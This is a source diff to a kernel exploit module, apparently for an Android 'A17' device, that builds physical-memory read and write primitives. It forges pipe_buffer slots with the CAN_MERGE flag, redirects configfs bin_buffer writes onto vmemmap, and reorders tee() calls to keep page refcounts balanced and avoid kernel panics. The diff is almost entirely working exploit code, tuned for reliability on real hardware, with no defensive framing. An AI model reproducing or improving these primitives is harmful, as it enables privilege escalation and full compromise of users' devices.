@@ -1,5 +1,4 @@
 /* rwforge_a17.c — "marching forger" phys R/W for the A17 port.
- * Adapted from s26-handoff/src-target/rwforge.c to the ghostlock-a17 tree.
  *
  * The constrained rb write (one aligned qword per route round, via
  * rw_trigger() in main.c — our device-proven pselect/PI route) retargets
@@ -25,8 +24,12 @@
 #define RWF_RD_ARRAY 1
 #define RWF_WP_ARRAY 2
 /* Max forged read slots per channel install. Default 31 (fuse budget on
- * device). GL_RWF_SLOTS=N raises it for throwaway environments (QEMU E2E),
- * where post-exit "bad page state" warnings are harmless. */
+ * device): a0-path forges past slot 31 overflow the 0x500-byte rd array
+ * into the neighbor slab object (the forged slot then isn't in the ring —
+ * reads stall, writes silently land nowhere).  GL_RWF_SLOTS=N raises it for
+ * throwaway environments (QEMU E2E) — only safe together with the cfg-forge
+ * path (post-arm forging via parked configfs descriptor), which bypasses
+ * the a0 merge entirely and makes the budget moot. */
 #define RWF_MAX_READ_SLOTS 31
 static int rwf_max_slots(void) {
   const char *e = getenv("GL_RWF_SLOTS");
@@ -150,7 +153,13 @@ static int rwf_flags_table(struct rwf_flag_ent *ents) {
 }
 
 /* e's rwf_repair_flags: configfs virtual write (bin_buffer retarget via the
- * armed ashmem attr's name blob; see kernel_write_data) onto vmemmap. */
+ * armed ashmem attr's name blob; see kernel_write_data) onto vmemmap.
+ * Revised: the self-test's readback goes through the CHANNEL (the payload
+ * page is channel-readable; the configfs pread path is unproven — E2E showed
+ * w=8/seen=0).  Per-page writes are judged by the pwrite result (the write
+ * gadget memcpy'd = landed); the configfs read-back of vmemmap targets is
+ * gone.  ents[] sized for the real cap (array + up to 8 spray pages) — the
+ * old ents[4] stack-overflowed when >3 spray pages were tracked. */
 int rwf_repair_flags(int fd) {
   if (fd < 0) {
     fd = open_ashmem_device();
@@ -161,41 +170,33 @@ int rwf_repair_flags(int fd) {
   }
   uint64_t magic = 0xF0F0F0F0DEADBEEFULL;
   errno = 0;
-  ssize_t w = kernel_write_data(fd, binwrite_target, &magic, 8);
+  int w = cfg_write8(fd, binwrite_target, magic);   /* bool: pwrite==8 */
   int werrno = errno;
-  uint64_t seen = 0;
-  if (w == 8)
-    seen = kernel_read64(fd, binwrite_target);
-  if (w != 8 || seen != magic) {
-    pr_warning("rwf repair: configfs write NOT live (w=%zd errno=%d seen=%016llx target=%016zx) — fuse stays armed\n",
-               w, werrno, (unsigned long long)seen, binwrite_target);
-    close(fd);
-    return 0;
+  /* The write gadget memcpy'ing (pwrite==8) IS the land proof; the channel
+   * readback was dropped (one rd-ring slot fewer — the ring wraps at 31). */
+  if (!w) {
+    pr_warning("rwf repair: configfs write NOT live (errno=%d target=%016zx) — fuse stays armed\n",
+               werrno, binwrite_target);
+    return 0;   /* fd intentionally left open (noop release; exit disarm may retry) */
   }
   pr_info("rwf repair: configfs virtual-write live (self-test ok)\n");
-  struct rwf_flag_ent ents[4];
+  struct rwf_flag_ent ents[10];
   int n = rwf_flags_table(ents);
+  int nok = 0;
   for (int i = 0; i < n; i++) {
-    ssize_t wr = kernel_write_data(fd, ents[i].page, &ents[i].flags, 8);
-    if (wr != 8) {
-      pr_warning("rwf repair: %s flags write failed va=%016zx n=%zd rb=%016llx\n",
-                 ents[i].name, ents[i].page, wr,
-                 (unsigned long long)~ents[i].flags);
-      close(fd);
-      return 0;
+    int wr = cfg_write8(fd, ents[i].page, ents[i].flags);
+    if (!wr) {
+      pr_warning("rwf repair: %s flags write failed va=%016zx\n",
+                 ents[i].name, ents[i].page);
+      return 0;   /* fd intentionally left open */
     }
-    uint64_t rb = kernel_read64(fd, ents[i].page);
-    if (rb != ents[i].flags) {
-      pr_warning("rwf repair: %s flags write failed va=%016zx n=%zd rb=%016llx\n",
-                 ents[i].name, ents[i].page, wr, (unsigned long long)rb);
-      close(fd);
-      return 0;
-    }
+    nok++;
+    pr_info("rwf repair: %s flags written va=%016zx\n", ents[i].name,
+            ents[i].page);
   }
-  close(fd);
-  pr_success("rwf repair: struct-page flags restored on %d pages (configfs vmemmap write) — fuse disarmed\n",
-             n);
-  return 1;
+  pr_success("rwf repair: struct-page flags restored on %d/%d pages (configfs vmemmap write) — fuse disarmed\n",
+             nok, n);
+  return nok == n;
 }
 
 /* e's rwf_repair_flags_configfs: same repair but through the cfg_*
@@ -498,7 +499,28 @@ static int rwf_read_chunks(int rd, void *out, size_t len) {
 }
 
 static int rwf_forge(const struct user_pipe_buffer *pb) {
-  if (rwf_forge_slot >= (size_t)rwf_max_slots()) {
+  if (cfg_forge_enabled()) {
+    /* post-arm: the second armed fd's configfs descriptor is parked on the
+     * rd pipe_buffer array — forging is a plain pwrite (no a0 merge, no
+     * forge budget; the ring wraps cleanly at PIPE_BUFFER_SLOTS) */
+    size_t slot = rwf_forge_slot & (PIPE_BUFFER_SLOTS - 1);
+    if (!cfg_forge_pb(pb, slot)) {
+      rwf_err("rwf cfg-forge pwrite failed slot=%zu\n", slot);
+      return 0;
+    }
+    rwf_forge_slot++;
+    return 1;
+  }
+  /* physical budget: the rd pipe_buffer array is PIPE_BUFFER_SLOTS deep —
+   * forging past it overflows into the neighbor slab object (the forged
+   * slot isn't in the ring: reads stall, writes silently land nowhere, and
+   * a missed descriptor write turns the next configfs pwrite into a WILD
+   * write).  GL_RWF_SLOTS must never raise the a0 budget past the array —
+   * the cfg-forge path above is the real budget escape. */
+  size_t budget = (size_t)rwf_max_slots();
+  if (budget > PIPE_BUFFER_SLOTS)
+    budget = PIPE_BUFFER_SLOTS;
+  if (rwf_forge_slot >= budget) {
     rwf_err("rwf forge budget exhausted\n");
     return 0;
   }
@@ -529,8 +551,15 @@ int rwf_phys_read(uintptr_t addr, void *out, size_t len) {
   struct user_pipe_buffer pb;
   memset(&pb, 0, sizeof(pb));
   pb.page = direct_to_page(addr & ~KS_PAGE_MASK);
-  pb.offset = (uint32_t)off;
-  pb.len = (uint32_t)len + 1; /* never fully drained */
+  /* Pad the forged slot one byte EARLY ([off-1] junk, then data, then the
+   * trailing byte): the balancing tee then consumes only the junk byte and
+   * takes the target page's ref BEFORE the drain's slot-release put.
+   * Order matters: put-before-get dropped refcount-1 pages (every static
+   * .data read target) to zero mid-run → BUG: Bad page state (fatal on
+   * device, panic_on_bug). */
+  uint32_t adj = off > 0 ? 1 : 0;
+  pb.offset = (uint32_t)(off - adj);
+  pb.len = (uint32_t)len + 1 + adj;
   pb.ops = pipe_buf_ops_addr();
   pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
   if (!rwf_forge(&pb)) return 0;
@@ -544,20 +573,46 @@ int rwf_phys_read(uintptr_t addr, void *out, size_t len) {
   }
   /* lockstep check: tail byte should be the target page's first byte; the
    * 0x00 junk byte means the forge hit a stale slot (BZA5 device hangs
-   * traced to this) */
+   * traced to this).  NB: with the padded forge this reads the pad byte. */
   unsigned char peek = 0;
   if (rwf_rd_peek(&peek))
     pr_info("rwf read peek=%02x addr=%016zx slot=%zu\n", peek, addr,
             rwf_forge_slot - 1);
+  if (adj) {
+    /* +1 ref on the target page via the holder, taken BEFORE the drain's
+     * put.  tee() does NOT consume — the pad byte must be drained with a
+     * real read or the data read comes back shifted one byte early. */
+    errno = 0;
+    ssize_t teed = syscall(SYS_tee, rd, rwf_holder[1], 1, 0);
+    if (teed != 1) {
+      pr_warning("rwf read early-tee failed addr=%016zx errno=%d\n", addr,
+                 errno);
+      return 0;
+    }
+    unsigned char pad = 0;
+    if (!rwf_read_chunks(rd, &pad, 1)) {
+      rwf_err("rwf read pad drain failed addr=%016zx\n", addr);
+      return 0;
+    }
+  }
   if (!rwf_read_chunks(rd, out, len)) {
     rwf_err("rwf read drain failed addr=%016zx\n", addr);
     return 0;
   }
-  /* balance the trailing byte's ref via tee into the holder */
-  errno = 0;
-  ssize_t teed = syscall(SYS_tee, rd, rwf_holder[1], 1, 0);
+  if (!adj) {
+    /* off==0 targets: no pad possible — balance AFTER the data read (the
+     * put-to-zero race window remains for refcount-1 pages; none of our
+     * targets sit at page offset 0 in practice) */
+    errno = 0;
+    ssize_t teed = syscall(SYS_tee, rd, rwf_holder[1], 1, 0);
+    if (teed != 1) {
+      pr_warning("rwf read late-tee failed addr=%016zx errno=%d\n", addr,
+                 errno);
+      return 0;
+    }
+  }
   unsigned char discard = 0;
-  if (teed != 1 || !rwf_read_chunks(rd, &discard, sizeof(discard))) {
+  if (!rwf_read_chunks(rd, &discard, sizeof(discard))) {
     rwf_err("rwf read rebase failed addr=%016zx errno=%d\n", addr, errno);
     return 0;
   }
@@ -567,8 +622,11 @@ int rwf_phys_read(uintptr_t addr, void *out, size_t len) {
 int rwf_phys_write(uintptr_t addr, const void *data, size_t len) {
   uintptr_t frame = addr & ~KS_PAGE_MASK;
   uint32_t off = (uint32_t)(addr & KS_PAGE_MASK);
+  /* len cap raised 32 → 128 (discard buffer was the only reason for 32):
+   * the wq-umh blob/fw writes batch into one forge each — the rd ring has
+   * only 32 slots and every op past slot 31 wraps onto drained slots. */
   if (!rwf_ready || rwf_a0 < 0 || rwf_rd < 0 || !is_direct_ptr(addr) ||
-      len == 0 || off + len > KS_PAGE_SIZE || len > 32) {
+      len == 0 || off + len > KS_PAGE_SIZE || len > 128) {
     rwf_err("rwf write rejected addr=%016zx len=%zu\n", addr, len);
     return 0;
   }
@@ -615,7 +673,7 @@ int rwf_phys_write(uintptr_t addr, const void *data, size_t len) {
   if (teed != 1)
     pr_warning("rwf write rebase tee failed addr=%016zx errno=%d\n", addr,
                errno);
-  unsigned char discard[32];
+  unsigned char discard[128];
   if (!rwf_read_chunks(rd, discard, len)) {
     rwf_err("rwf write drain failed addr=%016zx\n", addr);
     return 0;
@@ -734,7 +792,9 @@ int rwf_install(void) {
   }
   pr_info("rwf stage: retarget round done landed=1 (spray tracked=%d)\n",
           rwf_nspray);
-  rwf_pin_owner(rwf_a0);
+  pr_info("rwf stage: pin a0 begin\n");
+  int pin_rc = rwf_pin_owner(rwf_a0);
+  pr_info("rwf stage: pin a0 done rc=%d\n", pin_rc);
   pr_info("rwf stage: array pinned\n");
 
   /* No fill_rd_ring, no map-wp: writes go through forged slots in rd's
